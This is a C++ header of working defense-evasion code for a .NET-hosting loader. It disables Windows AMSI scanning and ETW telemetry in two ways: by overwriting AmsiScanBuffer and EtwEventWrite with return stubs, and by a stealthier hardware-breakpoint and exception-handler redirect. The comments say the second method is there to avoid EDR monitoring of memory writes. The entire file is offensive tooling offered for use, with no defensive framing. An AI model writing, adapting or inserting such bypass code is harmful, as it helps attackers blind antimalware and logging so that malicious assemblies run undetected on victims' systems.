// patches.h — AMSI and ETW bypass primitives
// Include this in any C++ loader and call PatchAmsi() / PatchEtw()
// before CLR Start() and AppDomain.Load().
//
// Two approaches provided for each:
//   1. Direct patch (simpler, more detectable)
//   2. Hardware breakpoint (no memory writes to monitored DLLs)

#pragma once
#include <windows.h>
#include <stdio.h>

// ============================================================================
//  Approach 1: Direct memory patching
// ============================================================================

// Patch amsi.dll!AmsiScanBuffer to return E_INVALIDARG
// The CLR loads amsi.dll during initialization, so call this AFTER
// pRuntimeHost->Start() but BEFORE AppDomain.Load()
static BOOL PatchAmsiDirect() {
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) {
        // Not loaded yet — try loading it so we can patch before CLR uses it
        hAmsi = LoadLibraryW(L"amsi.dll");
        if (!hAmsi) return FALSE;
    }

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;

    // x64: mov eax, 0x80070057; ret
    // This makes AmsiScanBuffer return E_INVALIDARG, causing the caller
    // to treat the scan as "nothing to report"
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    memcpy(pAmsiScanBuffer, patch, sizeof(patch));

    DWORD tmp;
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &tmp);

    return TRUE;
}

// Patch ntdll!EtwEventWrite to return SUCCESS without doing anything
// Call this BEFORE pRuntimeHost->Start() to prevent CLR telemetry
static BOOL PatchEtwDirect() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;

    // x64: xor eax, eax; ret → returns STATUS_SUCCESS
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };

    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    memcpy(pEtwEventWrite, patch, sizeof(patch));

    DWORD tmp;
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &tmp);

    return TRUE;
}

// ============================================================================
//  Approach 2: Hardware breakpoints (no memory modification)
//  Sets DR0/DR1 to break on AmsiScanBuffer/EtwEventWrite, then uses a
//  vectored exception handler to redirect execution.
//  This avoids VirtualProtect on ntdll/amsi pages, which S1 may monitor.
// ============================================================================

// Saved original bytes (not needed for HW BP approach but useful for restore)
static BYTE  g_amsiOriginalBytes[6] = {0};
static BYTE  g_etwOriginalBytes[3] = {0};
static void* g_pAmsiScanBuffer = NULL;
static void* g_pEtwEventWrite = NULL;

// Small trampoline: we need a RET gadget that returns the right value.
// We allocate executable memory with our return stubs.
static void* g_amsiRetStub = NULL;   // mov eax, E_INVALIDARG; ret
static void* g_etwRetStub = NULL;    // xor eax, eax; ret

static BOOL SetupReturnStubs() {
    // Allocate a small executable page for our return stubs
    void* page = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!page) return FALSE;

    unsigned char* p = (unsigned char*)page;

    // AMSI stub: mov eax, 0x80070057; ret
    g_amsiRetStub = p;
    p[0] = 0xB8; p[1] = 0x57; p[2] = 0x00; p[3] = 0x07; p[4] = 0x80; p[5] = 0xC3;
    p += 16; // align

    // ETW stub: xor eax, eax; ret
    g_etwRetStub = p;
    p[0] = 0x33; p[1] = 0xC0; p[2] = 0xC3;

    DWORD oldProtect;
    VirtualProtect(page, 4096, PAGE_EXECUTE_READ, &oldProtect);

    return TRUE;
}

// Vectored exception handler — catches hardware breakpoint hits
static LONG WINAPI HwBpHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    // Check which breakpoint fired
    CONTEXT* ctx = pExInfo->ContextRecord;

    if ((void*)ctx->Rip == g_pAmsiScanBuffer && g_amsiRetStub) {
        // Redirect to our return stub
        ctx->Rip = (DWORD64)g_amsiRetStub;
        // Clear DR0 so we don't break again on re-entry
        ctx->Dr0 = 0;
        ctx->Dr7 &= ~(DWORD64)1; // disable BP0
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if ((void*)ctx->Rip == g_pEtwEventWrite && g_etwRetStub) {
        ctx->Rip = (DWORD64)g_etwRetStub;
        ctx->Dr1 = 0;
        ctx->Dr7 &= ~(DWORD64)4; // disable BP1
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// Set a hardware breakpoint on the current thread using debug registers
static BOOL SetHardwareBreakpoint(int index, void* address) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx)) return FALSE;

    switch (index) {
        case 0:
            ctx.Dr0 = (DWORD64)address;
            ctx.Dr7 |= 1;        // enable DR0 (local)
            ctx.Dr7 &= ~(0xF << 16); // condition: execution (00), len: 1 byte (00)
            break;
        case 1:
            ctx.Dr1 = (DWORD64)address;
            ctx.Dr7 |= 4;        // enable DR1 (local)
            ctx.Dr7 &= ~(0xF << 20);
            break;
        case 2:
            ctx.Dr2 = (DWORD64)address;
            ctx.Dr7 |= 16;       // enable DR2 (local)
            ctx.Dr7 &= ~(0xF << 24);
            break;
        case 3:
            ctx.Dr3 = (DWORD64)address;
            ctx.Dr7 |= 64;       // enable DR3 (local)
            ctx.Dr7 &= ~(0xF << 28);
            break;
        default:
            return FALSE;
    }

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    return SetThreadContext(hThread, &ctx);
}

static BOOL ClearHardwareBreakpoints() {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx)) return FALSE;

    ctx.Dr0 = 0;
    ctx.Dr1 = 0;
    ctx.Dr2 = 0;
    ctx.Dr3 = 0;
    ctx.Dr7 = 0;

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    return SetThreadContext(hThread, &ctx);
}

// Set up hardware breakpoints for AMSI and ETW bypass
// Call this BEFORE starting the CLR
static BOOL PatchAmsiHwBp() {
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;
    g_pAmsiScanBuffer = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!g_pAmsiScanBuffer) return FALSE;

    if (!g_amsiRetStub && !SetupReturnStubs()) return FALSE;

    AddVectoredExceptionHandler(1, HwBpHandler);
    return SetHardwareBreakpoint(0, g_pAmsiScanBuffer);
}

static BOOL PatchEtwHwBp() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    g_pEtwEventWrite = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!g_pEtwEventWrite) return FALSE;

    if (!g_etwRetStub && !SetupReturnStubs()) return FALSE;

    AddVectoredExceptionHandler(1, HwBpHandler);
    return SetHardwareBreakpoint(1, g_pEtwEventWrite);
}

// ============================================================================
//  Convenience wrappers — pick your approach
// ============================================================================

enum PatchMethod {
    PATCH_DIRECT,     // Write patch bytes to memory (simpler, more detectable)
    PATCH_HWBP        // Hardware breakpoints (no memory writes, stealthier)
};

static BOOL PatchAmsi(PatchMethod method) {
    switch (method) {
        case PATCH_DIRECT: return PatchAmsiDirect();
        case PATCH_HWBP:   return PatchAmsiHwBp();
        default: return FALSE;
    }
}

static BOOL PatchEtw(PatchMethod method) {
    switch (method) {
        case PATCH_DIRECT: return PatchEtwDirect();
        case PATCH_HWBP:   return PatchEtwHwBp();
        default: return FALSE;
    }
}

// Cleanup: clear hardware breakpoints and free stubs
static void CleanupPatches() {
    ClearHardwareBreakpoints();
    if (g_amsiRetStub) {
        // Both stubs are on the same page
        VirtualFree(g_amsiRetStub, 0, MEM_RELEASE);
        g_amsiRetStub = NULL;
        g_etwRetStub = NULL;
    }
}
